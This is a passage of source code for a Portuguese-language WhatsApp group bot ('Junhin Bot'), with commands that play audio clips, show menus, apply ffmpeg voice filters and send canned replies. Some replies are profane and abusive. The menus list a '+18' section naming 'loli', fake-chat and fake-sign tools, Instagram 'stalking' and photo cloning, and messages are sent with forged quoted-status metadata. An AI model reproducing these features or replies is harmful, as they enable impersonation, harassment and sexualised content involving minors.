case '.nemo':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/nemo.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.kalidade':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/kalidade.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.macaverde':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/macaverde.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.cmgremio':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/cmgremio.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.cmflamengo':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/c3mflamengo.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.nikeb':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/nikeb.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'fame':
tujuh = fs.readFileSync('./assets/fame.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break


case 'iri':
tujuh = fs.readFileSync('./assets/iri.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break


case 'sound1':
tujuh = fs.readFileSync('./assets/sound1.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'sound2':
tujuh = fs.readFileSync('./assets/sound2.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break


case 'sound3':
tujuh = fs.readFileSync('./assets/sound3.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'sound4':
tujuh = fs.readFileSync('./assets/sound4.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'sound5':
tujuh = fs.readFileSync('./assets/sound5.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'sound6':
tujuh = fs.readFileSync('./assets/sound6.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break


case 'sound7':
tujuh = fs.readFileSync('./assets/sound7.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case 'enganarnamorada':
tujuh = fs.readFileSync('./assets/enganar.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case 'bomdia':
tujuh = fs.readFileSync('./assets/bomdia.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case 'oibot':
tujuh = fs.readFileSync('./assets/o3ibot.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case 'kkkkkkkk':
tujuh = fs.readFileSync('./assets/kkkk.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break




case 'pale':
tujuh = fs.readFileSync('./assets/pale.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case '.pepemoreno':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/pepemoreno.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break




case 'slv':
case 'roi':
case 'oe':
case 'eai':
case 'oiiii':
case 'oiie':
case 'oii':
case 'oi':
case 'oie':
case 'oiii':
tujuh = fs.readFileSync('./assets/roinn.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case '.donamaria':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/donamaria.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case '.comoduasfaca':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/comoduasfaca.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case '.despedidadecasal':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/despedidadecasal.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case '.previsível':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/previsível.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break






case '.orgânico':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/orgânico.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break





case 'boanoite':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/boanoite.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break






case 'falaoibot':
tujuh = fs.readFileSync('./assets/brabo.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'menu2':
case 'goku':
case 'midoryia':
case 'say84':
case 'menu3':
case 'say83':
case 'menu4':
case 'say82':
case 'daftar':
case 'say81':
case 's':
case 'say80':
case 'naruto':
case 'say79':
case 'google':
case 'say78':
case 'plogo':
case 'say77':
case 'anime':
case 'plogo2':
case 'say76':
case 'plogo3':
case 'say75':


hasil = ` *digita o comando com (.) prefixo*😛 `

reply(hasil)

      break
      
      

case '.menuanime':


  
reply(mess.wait)

hasil = `*Menu dos animes*
>>>>>>
*↓Mostra fotos aleatoria dos personagens abaixo ↓*
>>>>>>>
*( . ) naruto*
*( . ) goku*
*( . ) midoriya*
*( . ) allmight*
*( . ) overhaul*
*( . ) mightgay*
*( . ) luffy*
*( . ) vegeta*
*( . ) broly*
*( . ) bills*
*( . ) zoro*
*( . ) barbabranca*
*( . ) jiren*
*( . ) sakura*
*( . ) lemillion*
*( . ) hinata*
*( . ) kira*
*( . ) kuririn*
*( . ) kakashi*
*( . ) rocklee*
*𝐸𝑛𝑡𝑟𝑒 𝑜𝑢𝑡𝑟𝑜𝑠. ( + 300 )*
>>>>>>>
*𝐏𝐞𝐫𝐬𝐨𝐧𝐚𝐠𝐞𝐧𝐬 +18 😳*
↓ ↓ ↓
*( . ) neko*
*( . ) loli*
*( . ) hentai ( menu de hentai)*
>>>>>>>
*Menu de edit de anime*
*( . ) menu4*
↓ ↓ ↓ ↓ ↓
 *🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ domina$*`

reply(hasil)

     break      
      

case '.megapornozao':
      
 hasil = ` para de bater punheta mlk Kkkkkk vai vencer na vida poha, tanta bct real ai no mundo vc fica batendo pra vidiozinhokkkkk sifduerkkkkk`

Pin.sendMessage(from, hasil , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Menu anime", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

      break     
      

      
      
      
      
case 'junior':
case 'junin':     
case 'junhin':
      
 hasil = ` eu amo meu dono🙈❤`

reply(hasil)

      break     
      
case '.dono':   
hasil = `┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ NOME DO BOT : JUNHIN BOT
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ NUMERO DO DONO: wa.me/557187566648
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ TOTAL CHAT DO JUNHIN : 2008
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ TEU LINK : wa.me/${sender.split("@")[0]}
┗━━━━━━━━━━━━━━━━━━━ `

reply(hasil)
   break    
      
case '.sorteio':
numeros1 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
sorteio1 = numeros1[Math.floor(Math.random() * numeros1.length)]     

hasil = ` 🥈🎊 Número sorteado com sucesso ✔

aq o Número sorteado lhek 🍀 : *${sorteio1}*
`
reply(hasil)
break 




case 'clbc':     
case 'calada':
case 'calado':
case 'calaboca':
      
 hasil = ` calaboca ja morreu kkkkkk`

reply(hasil)

      break  
      
case '.menu':

reply(mess.wait)

      break      
      
      
      
      
case 'nn':
case 'N':
      
 hasil = ` ;-;`

reply(hasil)

      break  
      
      
      
      
      
      
case 'cadebot':
case 'cadebot?':
case 'bot??':
      
 hasil = ` DEIXA NEM EU EM PAZ😭😭😭`

reply(hasil)

      break      
      
      
      
      
      
      
 case 'fofo':
      
 hasil = ` fofo é o junhin 🙈❤kkkkkk`

reply(hasil)

      break       
      
      
      
      
      
      
case 'junhin':
      
 hasil = `blz mas vc ja mandou msg pro junhin hj? 🤨`

reply(hasil)

      break  
      
      
case 'te':
      
 hasil = ` ehh eu tbm 😔❤`

reply(hasil)

      break  
      
      
      
      
      

case 'mamago':
case 'mamaco':
case 'petro':
case 'negro':
case 'macaco':
      
 hasil = ` RACISTA FILHA DA PUTA, SUA SORTE É Q O MODO ANTIRACISMO TA OFF FILHA DA PUTA SE NN TU IA VER DESGRAÇADO, SE CONTINUAR O JUNHIN VAI DAR BAN SEU LIXO `

reply(hasil)

      break  
      
      
      
      
      
      
case 'tudo bem?':     
case 'tudo bom?':
case 'tudo':
     
hasil = `ta tudo sim meu chapa :)`

reply(hasil)

      break
      
      
      
      
      
      
case 'boa noite':
case 'boa':
case 'bom':
      
hasil = ` de bom só o junhin :v`

reply(hasil)

      break
      
      
      
      
case 'tnc':      
case 'vsf':     
case 'vsfd':
case 'tmnc':
case 'vsfdr':

hasil = ` vamos juntos fdp 🙂`

reply(hasil)

      break




//-- menu

case '#menu':

case '#help':

case '!help':

case '!menu':

case '/menu':

case '/help':

case 'help':

case 'menu':

hasil = `        ────────────────

𝐍 𝐄 𝐄𝐒𝐒𝐄 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 *${pushname}* TENTA DIGITAR ${prefix}MENU

        ────────────────`

reply(hasil)

      break

}



			switch(command) {
			
case 'junhinkey':

case 'help':

  case 'menu':

    case 'cmd':

  if (!isRegister) return reply(mess.only.daftarB)
  const menu1 = fs.readFileSync('./src/menu/menu1.jpeg');
  const menu2 = fs.readFileSync('./src/menu/menu2.jpeg');
  const menu3 = fs.readFileSync('./src/menu/menu3.jpeg');
  const menu4 = fs.readFileSync('./src/menu/menu4.jpeg');
  const menu5 = fs.readFileSync('./src/menu/menu5.jpeg');
  menu6 = ["menu1", "menu2","menu3","menu4","menu5"]
  menu7 = menu6[Math.floor(Math.random() * menu6.length)]
  menu8 = fs.readFileSync('./src/menu/'+menu7+'.jpeg')
  
  uptime = process.uptime()

  teks = `┏━━━ ⏤͟͟͞ 「 *𝘑𝘜𝘕𝘏𝘐𝘕 𝘉𝘖𝘛☂︎™* 」
┃ ┏━━━━━━━━━━━━━━
┃ ┃ঔৣ͜͡➳ *${prefix}Info*
┃ ┃  (informações do bot)
┃ ┃ঔৣ͜͡➳ *${prefix}criador ou .dono*
┃ ┃(Informações proprietário do Bot) ┃ ┃ঔৣ͜͡➳ *${prefix}speed*
┃ ┃(veja a velocidade do bot)
┃ ┃ঔৣ͜͡➳ *${prefix}covidbr*
┃ ┃(veja as informações do covid)
┃ ┃ঔৣ͜͡➳ *${prefix}aluguel* 
┃ ┃(opções pra alugar ou compra esse bot 👨‍💻 )     
┃   ┗━━━━━━━━━━━━━━       
┗━━━ 〘  *𝘓𝘪𝘴𝘵𝘢 𝘥𝘦 𝘮𝘦𝘯𝘶𝘴* 〙
┃┏━━━━━━━━━━━━
┃┃ *( .menu2)*  *(.menu3)* *(.menu4)* *(menu5)* *(menu6)*  *(.menu7)*  *(.menu8)* *(.menu9)* *(.menu10)*
┃┗━━━━━━━━━━━━
┗━━━〘  *𝘔𝘶𝘴𝘪𝘤𝘢 🎼* 〙
ᴅɪɢɪᴛᴇ ( *.ᴍᴇɴᴜ2*) ᴏᴜ ( *.ᴍᴇɴᴜᴍᴜsɪᴄᴀ*)    ᴘᴀʀᴀ ᴠᴇʀ ᴍᴇɴᴜ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴍᴜsɪᴄᴀ🎶
┃┗━━━━━━━━━━━━
┗━━━〘  *𝘗𝘭𝘢𝘤𝘢*🔞 〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *.logo1*
┃┃(plaquinha fake🔞)
┃┃ঔৣ͜͡➳ *.plogo*
┃┃(plaquinha fake🔞)
┃┃ঔৣ͜͡➳ *.plogo2*
┃┃(plaquinha fake🔞)
┃┃ঔৣ͜͡➳ *.plaquinha*
┃┃(plaquinha fake🔞)
┃┃ঔৣ͜͡➳ *.plaquinha2*
┃┃(plaquinha fake🔞)
┃┃ঔৣ͜͡➳ *.plaquinha3*
┃┃(plaquinha fake🔞)
┃┗━━━━━━━━━━━━  ┗━━〘  *jogo da velha* 〙   

 >> ঔৣ͜͡➳ ᴅɪɢɪᴛᴇ ( *.ᴍᴇɴᴜ3* ) ᴏᴜ ( *.ᴛᴛᴛʜᴇʟᴘ* ) ᴘᴀʀᴀ ᴠᴇʀ ᴏ ᴍᴇɴᴜ ᴅᴇ ᴊᴏɢᴏ ᴅᴀ ᴠᴇʟʜᴀ ✖⭕

┃┗━━━━━━━━━━━━━
┗━━━〘  *𝘌𝘥𝘪𝘵 𝘥𝘦 𝘧𝘰𝘵𝘰 𝘦 𝘵𝘦𝘹𝘵𝘰* 〙   
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *.texto*   (TEXTO)
┃┃ঔৣ͜͡➳ *.pornhub*   (TEXTO)
┃┃ঔৣ͜͡➳ *.hub*   (TEXTO/COMENTARIO)
┃┃ঔৣ͜͡➳ *.textodafoto*   (FOTO)
┃┃ঔৣ͜͡➳ *.chlogo* (NÚMERO)
┃┃ঔৣ͜͡➳ *.grafitir* (TEXTO)
┃┃ঔৣ͜͡➳ *.blackpink* (TEXTO)           
┃┃ঔৣ͜͡➳ *.holographic* (TEXTO)
┃┃ঔৣ͜͡➳ *.text1917* (TEXTO)            
┃┃ঔৣ͜͡➳ *.bloodfrosted* (TEXTO)
┃┃ঔৣ͜͡➳ *.halloween* (TEXTO)
┃┃ঔৣ͜͡➳ *.arti* (TEXTO)
┃┃ঔৣ͜͡➳ *.chatfake* (TEXTO)
┃┗━━━━━━━━━━━━━━        
┗━━━━〘  *𝘦𝘥𝘪𝘵𝘴🎥* 〙   
ᴅɪɢɪᴛᴇ ( *.ᴍᴇɴᴜ4*) ᴏᴜ ( *ᴍᴇɴᴜᴇᴅɪᴛ* )ᴘᴀʀᴀ ᴠᴇʀ ᴜᴍ ᴍᴇɴᴜ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴇᴅɪᴄᴏᴇs📸
┃┗━━━━━━━━━━━━━
┗━━━━〘 *𝘎𝘙𝘜𝘗𝘖* 〙
┃┏━━━━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}Leveling on* 
┃┃(deixar o grupo no modo xp\ off pra desativar)
┃┃ঔৣ͜͡➳ *${prefix}Level* 
┃┃(conheça o seu xp)
┃┃ঔৣ͜͡➳ *${prefix}Listadmin* 
┃┃(Exibições de lista admin)
┃┃ঔৣ͜͡➳ *${prefix}Listonline* 
┃┃(Exibe uma lista de membros online)
┃┃ঔৣ͜͡➳ *${prefix}Closegc* 
┃┃(Fechar o Grupo)
┃┃ঔৣ͜͡➳ *${prefix}Opengc*
┃┃(Abrir o grupo)
┃┃ঔৣ͜͡➳ *.bemvindo on*
┃┃ (bot entra no modo boas vindas)
┃┃ঔৣ͜͡➳ *${prefix}Promote* 
┃┃ (Levante o departamento admin)
┃┃ঔৣ͜͡➳ *${prefix}Demote* 
┃┃ (Rebaixado admin)
┃┃ঔৣ͜͡➳ *${prefix}Setname*
┃┃(Renomeia o grupo)
┃┃ঔৣ͜͡➳ *${prefix}Setdesk*
┃┃(Alterar a descrição do grupo)
┃┃ঔৣ͜͡➳ *${prefix}Add*
┃┃ (Adicionar membro)
┃┃ঔৣ͜͡➳ *${prefix}marcar*
┃┃(Identificar todos os membros)
┃┃ঔৣ͜͡➳ *${prefix}marcar2*
┃┃(Identificar todos os membros)
┃┃ঔৣ͜͡➳ *${prefix}marcar3*
┃┃(Identificar todos os membros)
┃┃ঔৣ͜͡➳ *${prefix}Linkgrupo* 
┃┃(Pegue o link do grupo)
┃┃ঔৣ͜͡➳ *${prefix}suicide*
┃┃( bot sair do grupo) 
┃┃ঔৣ͜͡➳ *${prefix}Notif*
┃┃(Notificar todos os membros)
┃┃ঔৣ͜͡➳ *${prefix}Delete* 
┃┃ (Apagar mensagens do Bot) 
┃┗━━━━━━━━━━
┗━━━〘 *𝘔𝘦𝘮𝘦*〙
𝘋𝘪𝘨𝘪𝘵𝘦 *.𝘮𝘦𝘯𝘶5* 𝘰𝘶 *.𝘮𝘦𝘯𝘶𝘴𝘩𝘪𝘵* 𝘗𝘢𝘳𝘢 𝘷𝘦𝘳 𝘶𝘮 𝘮𝘦𝘯𝘶 𝘦𝘴𝘱𝘦𝘤𝘪𝘢𝘭 𝘱𝘢𝘳𝘢 𝘴𝘩𝘪𝘵/𝘮𝘦𝘮𝘦
┃┗━━━━━━━━━━
┗━━━〘 *𝘈𝘶𝘥𝘪𝘰🔊* 〙
┃┏━━━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}esquilo (marque o audio)*
┃┃ (Transforma voz em esquilo) 
┃┃ঔৣ͜͡➳ *${prefix}Slow (marque audio)*
┃┃ (Alterar a velocidade do áudio) 
┃┃ঔৣ͜͡➳ *${prefix}Gemuk (marque audio)*
┃┃ (Raposa de voz baixa)
┃┃ঔৣ͜͡➳ *${prefix}grave (Reply audio)*
┃┃ (Aumente os graves do áudio) 
┃┗━━━━━━━━━━━━
┗━━━━〘 *𝘈𝘕𝘐𝘔𝘌* 〙
ᴅɪɢɪᴛᴇ *ᴍᴇɴᴜ6* ᴏᴜ *ᴍᴇɴᴜᴀɴɪᴍᴇ* ᴘᴀʀᴀ ᴠᴇʀ ᴜᴍ ᴍᴇɴᴜ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴀɴɪᴍᴇ
┃┗━━━━━━━━━━━
┗━━━━〘 *𝘍𝘌𝘙𝘙𝘈𝘔𝘌𝘕𝘛𝘈𝘚* 〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}s ou .stiker ou .sticker* 
┃┃ (Faça adesivos de fotos/video)
┃┃ঔৣ͜͡➳ *${prefix}Traduzir*
┃┃ (traduzar palavras para o português)
┃┃ঔৣ͜͡➳ *.perfil*
┃┃ (mostra sua ft de perfil é sua wa.me)
┃┃ঔৣ͜͡➳ *${prefix}Ttp (Teks)* 
┃┃ (Crie adesivos a partir de texto)
┃┃ঔৣ͜͡➳ *${prefix}Toimg* 
┃┃ (Transforme adesivos em fotos)
┃┃*${prefix}Tomp3* 
┃┃ (Converte vídeo em áudio)
┃┃ঔৣ͜͡➳ *${prefix}play (Texto)* 
┃┃ (Tocar a musica selecionada)
┃┃ঔৣ͜͡➳ *${prefix}play2 (Texto)* 
┃┃ (caso o .play não funcione, use esse )
┃┃ঔৣ͜͡➳ *${prefix}ytplay (Texto)* 
┃┃ (informações e links da musica pesquisada)
┃┃ঔৣ͜͡➳ *${prefix}Tts pt(Texto)*
┃┃ (Texto com som)
┃┃ঔৣ͜͡➳ *${prefix}Igstalk (username)*
┃┃(Perseguição ao Instagram)
┃┃ঔৣ͜͡➳ *.attp*
┃┃ ( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *.attp2*
┃┃ ( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *.attp3*
┃┃ ( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *.attp4*
┃┃( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *.attp5*
┃┃ ( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *.attp6*
┃┃ ( Faz figurinha de acordo com o pedido )
┃┃ঔৣ͜͡➳ *${prefix}Wame* 
┃┃(Faço link da sua wa.me)
┃┃ঔৣ͜͡➳ *${prefix}Wait* 
┃┃ (Informações de anime de fotos de anime q quiser)
┃┗━━━━━━━━━━━━         
┗━━━━〘* 𝘑𝘰𝘨𝘰𝘴* 〙
 ᴅɪɢɪᴛᴇ *.ᴍᴇɴᴜ7* ᴏᴜ *.ᴍᴇɴᴜᴊᴏɢᴏs* ᴏᴜ *.ᴊᴏɢᴏs* ᴘᴀʀᴀ ᴠᴇʀ ᴜᴍ ᴍᴇɴᴜ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴊᴏɢᴏs
┃┗━━━━━━━━━━━━   
┗━━━━━〘 *𝘍𝘰𝘵𝘰* 〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}Wp* 
┃┃(wallpaper aleatório)
┃┃ঔৣ͜͡➳ *${prefix}google(Consulta)*
┃┃(Encontre a imagem de acordo com o pedido)
┃┃ঔৣ͜͡➳ *${prefix}menu6*
┃┃( mostra imagens de +300 personagem de anime)
┃┗━━━━━━━━━━━━   
┗━━━ 〘* 𝙏𝙚𝙧𝙢𝙪𝙭👨‍💻* 〙
ᴅɪɢɪᴛᴇ *.ᴍᴇɴᴜ8* ᴏᴜ *.ᴍᴇɴᴜᴛᴇʀᴍᴜx* ᴘᴀʀᴀ ᴠᴇʀ ᴜᴍ ᴍᴇɴᴜ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴛᴇʀᴍᴜx
┃┗━━━━━━━━━━━
┃>> ঔৣ͜͡➳ᴅɪɢɪᴛᴇ ( *.ᴍᴇɴᴜ9* ) ᴏᴜ ( *.ᴍᴇɴᴜᴊᴜɴʜɪɴ* ) ᴘᴀʀᴀ ᴠᴇʀ ᴀs ʀᴇᴅᴇs sᴏᴄɪᴀɪs ᴅᴏ ᴍᴇᴜ ᴅᴏɴᴏ  criador principal
-------------------------------------------
┃>> ঔৣ͜͡➳ ᴅɪɢɪᴛᴇ ( *.ᴍᴇɴᴜ10* ) ᴏᴜ ( *.ᴍᴇɴᴜᴍᴏᴛɪᴠᴀᴄᴀᴏ* ) ᴘᴀʀᴀ ᴠᴇʀ ᴜᴍ ᴍᴇɴᴜ ᴍᴜɪᴛᴏ ᴇsᴘᴇᴄɪᴀʟ ᴘᴀʀᴀ ᴍᴏᴛɪᴠᴀᴄᴀᴏ 🤺
┗━━━〘 𝙍𝙚𝙨𝙩𝙧𝙞𝙘𝙤𝙚𝙨 🚫〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}antiracismo on*
┃┃(deixa o grupo no modo antiracismo, off pra desativar)
┃┃ঔৣ͜͡➳ *.antifake 1*
┃┃(deixa o grupo no modo anti numero fake, 0 pra desativar)
┃┃ঔৣ͜͡➳ *.antilink on* 
┃┃(deixa o grupo no modo antilink,off pra desativar)
┃┗━━━━━━━━━━━━
┗━━━〘* só o dono 😻 *〙
┃┏━━━━━━━━━━
┃┃ঔৣ͜͡➳ *${prefix}Clone*
┃┃ (Clonar a foto do alvo) 
┃┃ঔৣ͜͡➳ *${prefix}Block* 
┃┃ (Bloquear alvo específico)
┃┃ঔৣ͜͡➳ *${prefix}remover* 
┃┃ (remove do grupo alvo específico)
┃┃ঔৣ͜͡➳ *${prefix}Ban* 
┃┃ (o alvo específico não usara os comandos do bot )
┃┃ঔৣ͜͡➳ *${prefix}unban* 
┃┃ (alvo específico volta usar comandos)
┃┃ঔৣ͜͡➳ *${prefix}Unblock* 
┃┃ (Desbloquear alvo específico)
┃┃ঔৣ͜͡➳ *${prefix}Bc* 
┃┃ (Transmitir mensagem)
┃┃ঔৣ͜͡➳ *${prefix}hidetag* 
┃┃ঔৣ͜͡➳ *${prefix}antipalavrao* 
┃┃ (quem xinga oq o junhin determinar vai ser kitado )
┃┃ঔৣ͜͡➳ *${prefix}addpalavra*
┃┃ (adiciona palavrão)
┃┃ঔৣ͜͡➳ *${prefix}delpalavra* 
┃┃ (remove todos os palavrao)
┃┃ঔৣ͜͡➳ *${prefix}Blocklist* 
┃┃ (Listar usuário terblokir) 
┃┗━━━━━━━━━━
┗━━━━━━━━━━━━━━
*CASO ALGUM BUG DO BOT, DIGITA .BUGREPORT é o bug ao lado. pfvr sem spam*
    *🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$*`

  Pin.sendMessage(from, menu8 , image, {quoted: mek, caption: teks, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Menu️", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})					

                break



//-- audio

					case 'slow':

					low = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					slo = await Pin.downloadAndSaveMediaMessage(low)

					ran = getRandom('.mp3')

					exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {

						fs.unlinkSync(slo)

						if (err) return reply('Error!')

						hah = fs.readFileSync(ran)

						Pin.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})

						fs.unlinkSync(ran)

					})

				break

				case 'esquilo':

					pai = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo



					tup = await Pin.downloadAndSaveMediaMessage(pai)

					ran = getRandom('.mp3')

					exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {

						fs.unlinkSync(tup)

						if (err) return reply('Error!')

						hah = fs.readFileSync(ran)

						Pin.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})

						fs.unlinkSync(ran)

					})

				break

				case 'gemuk':

					muk = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo



					gem = await Pin.downloadAndSaveMediaMessage(muk)

					ran = getRandom('.mp3')

					exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {

						fs.unlinkSync(gem)

						if (err) return reply('Error!')

						hah = fs.readFileSync(ran)

						Pin.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})

						fs.unlinkSync(ran)

					})

				break
				
				case 'grave':                 

					ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo



					bas = await Pin.downloadAndSaveMediaMessage(ass)

					ran = getRandom('.mp3')

					exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {

						fs.unlinkSync(bas)

						if (err) return reply('Error!')

						hah = fs.readFileSync(ran)

						Pin.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})

						fs.unlinkSync(ran)

					})




					break
					
//-- mais menus					
					
case 'menumusica':
case 'menu2':

  if (!isRegister) return reply(mess.only.daftarB)

  try {
reply(mess.wait)
ppimg = await Pin.getProfilePicture(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSExjoynH7k1FwMYGRpVFLRgA6Ue8MFiY2-XA&usqp=CAU`)

  } catch {

ppimg = 'https://i.ibb.co/2kpZpm8/images-48.jpg'

  }

  teks = `┏━━━━━━━━━━━━━━━
         〘  músicas🎵 🎶🎼 〙                    🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina~
ঔৣ͜͡➳.mundoEesse                            
ঔৣ͜͡➳.orgânico                              
ঔৣ͜͡➳.despedidadecasal                       
ঔৣ͜͡➳.comoduasfaca                          
ঔৣ͜͡➳.previsível                           
ঔৣ͜͡➳.pepemoreno                            
ঔৣ͜͡➳.donamaria                               
ঔৣ͜͡➳.sexo                                 
ঔৣ͜͡➳.lilpeep                                 
ঔৣ͜͡➳.ghost                               
ঔৣ͜͡➳.voar                           
